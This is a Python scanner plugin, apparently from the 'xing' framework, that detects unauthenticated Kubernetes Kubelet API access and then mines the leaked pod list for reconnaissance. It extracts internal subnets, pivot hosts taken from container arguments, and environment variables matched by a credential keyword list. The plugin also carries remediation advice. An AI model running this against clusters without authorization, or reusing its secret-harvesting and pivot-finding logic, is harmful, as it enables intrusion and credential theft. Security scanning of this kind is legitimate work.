import json
import re
from collections import Counter
from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType

SENSITIVE_ENV_KEYS = (
    "password", "passwd", "secret", "token", "api_key", "apikey",
    "access_key", "private_key", "credential", "auth", "allow_none_authentication"
)

TARGET_ARG_PATTERNS = [
    re.compile(r"--proxy-server-host=([^\s]+)"),
    re.compile(r"--server-addr=([^\s]+)"),
    re.compile(r"--etcd-servers=([^\s]+)"),
    re.compile(r"--master=([^\s]+)"),
    re.compile(r"--api-servers=([^\s]+)"),
]


def mask_secret(val: str, key_name: str) -> str:
    if not val:
        return ""
    if key_name.lower() == "allow_none_authentication":
        return val
    if len(val) <= 6:
        return "***"
    return f"{val[:3]}***{val[-3:]}"


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Kubelet API 未授权访问"
        self.app_name = 'Kubelet'
        self.scheme = [SchemeType.HTTPS, SchemeType.HTTP]
        self.severity = "Critical"
        self.description = "Kubernetes Kubelet API 未开启鉴权认证（常见于 10250/10255 端口），未经身份认证的攻击者可通过 API 端点直接列出节点运行的全部 Pod 容器详情，甚至执行命令接管节点。"
        self.remediation = "在 Kubelet 配置文件或启动参数中设置 --anonymous-auth=false 禁用匿名访问，并将 --authorization-mode 设置为 Webhook 或配置严格的双向 TLS 证书认证。"
        self.references = ["https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-authentication-authorization/"]

    def _extract_intelligence(self, content: bytes, url: str) -> str:
        """
        深度解析 Pod spec，提取核心情报：
        1. 命名空间分布与 Pod 统计
        2. hostNetwork 容器数
        3. 推测内部 Pod 网段 CIDR
        4. 外部跳板代理 / 控制面主机（如 konnectivity-agent, yurthub）
        5. 敏感环境变量明文（安全脱敏展示）
        """
        try:
            data = json.loads(content.decode("utf-8", errors="ignore"))
            items = data.get("items", [])
            if not isinstance(items, list):
                return url

            total_pods = len(items)
            ns_counts = Counter()
            hostnet_cnt = 0
            pod_ips = set()
            pivots = []
            sensitive_envs = []

            # 遍历 Pod items（限制前 60 个以保证解析性能并防止 OOM）
            for pod in items[:60]:
                if not isinstance(pod, dict):
                    continue

                metadata = pod.get("metadata", {})
                spec = pod.get("spec", {})
                status = pod.get("status", {})

                # 统计命名空间
                ns = metadata.get("namespace") or "default"
                ns_counts[ns] += 1

                # 统计 hostNetwork
                if spec.get("hostNetwork"):
                    hostnet_cnt += 1

                # 收集 IP
                p_ip = status.get("podIP")
                if p_ip and not p_ip.startswith(("127.", "0.")):
                    pod_ips.add(p_ip)
                for ip_obj in status.get("podIPs", []):
                    if isinstance(ip_obj, dict) and ip_obj.get("ip"):
                        pod_ips.add(ip_obj["ip"])

                # 检查容器启动参数与环境变量
                containers = spec.get("containers", []) + spec.get("initContainers", [])
                for c in containers:
                    if not isinstance(c, dict):
                        continue
                    c_name = c.get("name") or "container"

                    # 提取跳板参数
                    args_list = (c.get("command") or []) + (c.get("args") or [])
                    args_text = " ".join(str(a) for a in args_list)
                    for pat in TARGET_ARG_PATTERNS:
                        m = pat.search(args_text)
                        if m:
                            pivot_val = f"{c_name} -> {m.group(0)}"
                            if pivot_val not in pivots and len(pivots) < 5:
                                pivots.append(pivot_val)

                    # 提取敏感环境变量
                    for env in c.get("env", []):
                        if not isinstance(env, dict):
                            continue
                        e_name = env.get("name", "")
                        e_val = env.get("value")
                        if e_name and any(k in e_name.lower() for k in SENSITIVE_ENV_KEYS):
                            val_str = str(e_val) if e_val is not None else ""
                            masked = mask_secret(val_str, e_name)
                            item_str = f"{e_name}={masked}"
                            if item_str not in sensitive_envs and len(sensitive_envs) < 8:
                                sensitive_envs.append(item_str)

            # 计算推断的 Pod 子网网段 (/24)
            subnets = sorted(list(set(".".join(ip.split(".")[:3]) + ".0/24" for ip in pod_ips if "." in ip)))
            ns_summary = ", ".join(f"{k} ({v})" for k, v in ns_counts.most_common(4))

            lines = [
                f"URL: {url}",
                f"容器拓扑: 泄露 {total_pods} 个 Pod | 命名空间分布: {ns_summary} | hostNetwork 容器: {hostnet_cnt} 个"
            ]
            if subnets:
                lines.append(f"内网网段推演: {', '.join(subnets[:3])} (采样 IP: {', '.join(sorted(list(pod_ips))[:4])})")
            if pivots:
                lines.append(f"关键外联跳板/控制面: {'; '.join(pivots)}")
            if sensitive_envs:
                lines.append(f"敏感环境变量泄露: {', '.join(sensitive_envs)}")

            return "\n".join(lines)
        except Exception:
            return url

    def verify(self, target):
        paths = ["/pods", "/runningpods/"]
        for path in paths:
            url = target + path
            try:
                conn = http_req(url)
            except Exception:
                continue

            if not conn or not conn.ok:
                continue

            content = conn.content
            if b"<html" in content.lower():
                continue

            # 严格特征校验：必须命中 PodList，或者在包含 items+metadata 基础上必须同时具备 apiVersion 与容器规范（containers/spec），杜绝泛 REST API 误报
            is_pod_list = b'"kind":"PodList"' in content or b'"kind": "PodList"' in content
            is_k8s_items = (b'"items"' in content and b'"metadata"' in content and b'"apiVersion"' in content
                            and (b'"containers"' in content or b'"spec"' in content))

            if is_pod_list or is_k8s_items:
                self.logger.success("发现 Kubelet API 未授权访问 {}".format(self.target))
                return self._extract_intelligence(content, url)

        return False
